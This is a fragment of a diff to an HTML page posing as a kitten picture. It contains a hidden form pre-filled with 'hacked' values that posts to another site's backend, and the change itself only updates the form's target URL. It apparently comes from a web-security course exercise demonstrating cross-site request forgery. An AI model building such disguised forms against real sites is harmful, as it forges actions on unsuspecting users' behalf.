@@ -7,7 +7,7 @@
         <title>Картинка с котиком :3</title>
     </head>
     <body>
-        <form method="post" action="http://u41031.kubsu-dev.ru/web_backend/task-7/index.php">
+        <form method="post" action="http://u41031.kubsu-dev.ru/backend_7/index.php">
             <div class="form-group" style="display:none;">
                     <input type="text" name="name" value="взломан">
                     <input type="text" name="email" value="hacked@mail.ru">
